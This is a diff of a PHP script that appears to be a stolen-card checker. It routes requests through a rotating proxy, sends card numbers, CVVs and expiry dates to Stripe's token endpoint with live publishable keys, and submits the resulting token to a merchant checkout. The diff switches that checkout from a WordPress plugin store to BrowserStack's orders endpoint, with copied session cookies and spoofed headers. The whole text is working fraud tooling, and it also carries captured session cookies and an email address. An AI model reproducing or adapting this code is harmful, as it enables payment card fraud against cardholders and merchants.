@@ -107,13 +107,13 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: api.stripe.com',
 'method: POST',
-'path: /v1/payment_methods',
+'path: /v1/tokens',
 'scheme: https',
 'accept: application/json',
 'accept-language: en-US,en;q=0.9',
@@ -134,7 +134,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d5d641d1-8763-493b-b1a9-f4e909c63e0bcc0c50&muid=bb8c9f57-32ad-404c-a7ca-ad12792a8d6f04ef72&sid=364a64af-bb3a-46a2-941d-774c773b7f5f4a5019&pasted_fields=number&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=29942&key=pk_live_Cr3TTLP8pvQScjSVW4OpKbTX00AE5H2POt');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_zip]='.$zip.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d910e15b-4737-4ff5-806c-754cd6023b10216ade&muid=0b0fb6c6-1728-4310-bef1-24670791017bae75da&sid=107f0a2f-a627-4f9f-925f-15e45d31525daebfc8&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=41990&key=pk_live_40g8bjuzvlOrPg0e4GbbFEGWaD9ehS59BE6vzNgZz59YAHsT5BtwyEBGEWL5PpT2I1qrjSpxS8YOA7bipleQr74Rs000PhWZ1qY&pasted_fields=number');
 
 
 
@@ -146,7 +146,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://wpmanageninja.com/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_URL, 'https://accounts.browserstack.com/orders');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -157,16 +157,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: wpmanageninja.com',
+'authority: accounts.browserstack.com',
 'method: POST',
-'path: /wp-admin/admin-ajax.php',
+'path: /orders',
 'scheme: https',
-'accept: application/json, text/javascript, */*; q=0.01',
+'accept: text/javascript, application/json',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=r1b003egiie2m6enpcqg5q7du4; futm_details=a:3:{s:4:"ut_c";s:7:"upgrade";s:5:"utc_m";s:4:"menu";s:5:"utm_s";s:6:"plugin";}; na_edd_cart_token=db24bee04a292db271b46d57f4f0851e; edd_items_in_cart=1; __stripe_mid=bb8c9f57-32ad-404c-a7ca-ad12792a8d6f04ef72; __stripe_sid=364a64af-bb3a-46a2-941d-774c773b7f5f4a5019; crisp-client/session/162745af-315c-4769-b7dc-b37fc872bb0a=session_e72a3fbd-9809-4a61-af1e-7a97bccd5ce6',
-'origin: https://wpmanageninja.com',
-'referer: https://wpmanageninja.com/checkout/?discount=VDAY2021',
+'cookie: tracking_id=2c05260f-e67b-48be-ad8a-0cc34fa03e1e; moved=1; bs_deviceId=7621522b-218b-baa9-5f9f-8f1727651bf0; p_buy=false; ab_users={"45":98,"33":-1,"36":-1,"_allocation":"8dae17bd-75f3-47e8-b783-f95ac4cda189","60":129,"57":123,"40":87,"58":125,"59":127,"55":119,"63":134,"48":105,"54":116}; ga_pa_status=npa; _session=b07d01737c4298cdfb870d8deb75dce1; bs_logging_id=5949454; bs_group_id=5866654; bs_user_details={"user_details":{"user_id":5949454,"group_id":5866654},"plan_details":{"live_testing":{"type":"Trial"},"automate":{"type":"Trial"},"screenshot":{"type":"Trial"},"app_live_testing":{"type":"Trial"},"app_automate":{"type":"Trial"},"percy":{"type":"Trial"},"high_scale_testing":{"type":"Trial"}}}; bs_chat_channels=pricing_chat_without_auto_open; show_freshchat=2; __cf_bm=NqdahUcYhjIbMO_IvIqpXqUlPP68StVwbXvPlq7uvrw-1649150476-0-AeSBiFQoRCywbKs7SSLNFQUXLvVXpVNO8UKKkrmEa+yFK4eJOfYQF+W0mWHtIiLDshgSlQo4rrOEObY8vywZBvM=; __cfruid=596fbf01e2b384a5ca493f5fb38727b4efc008fa-1649150476; GAstartTime=1649150478111; GAlastSentTime=1649150491401',
+'origin: https://www.browserstack.com',
+'referer: https://www.browserstack.com/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -175,7 +175,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'action=edds_process_purchase_form&form_data=payment-mode%3Dstripe%26edd_action%3Dgateway_select%26page_id%3D267%26edd_first%3DJhon%26edd_last%3DMakdj%26edd_email%3Dsoykot_hasan%2540yahoo.com%26card_name%3DJhon%2520Jaox%26edd_action%3Dpurchase%26edd-gateway%3Dstripe%26edd-process-checkout-nonce%3D044905c6ca&payment_method_id='.$id.'&payment_method_exists=false');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&authenticity_token=ku%2Bb%2Bjy3AQkzVsLfBdGO%2BCDfYyqyzZzGFT%2FIe81xEZQ3tTnhkgO92hDtaoOZW3E7gu7IqO0D9IgJJW8udppYJw%3D%3D&is_from_checkout_page=true&is_tax_checkout_page=true&stripeToken='.$id.'&cardDetails=null&authenticity_token=DmyzzUZ5hC%2BdPqo1QmcsjMgabqWkMl95dBQXV93JJkqrNhHW6M04%2FL6FAmne7dNPaivFJ%2Fv8NzdoDrACZiJv%2BQ%3D%3D');
 
 
 $result2 = curl_exec($ch);
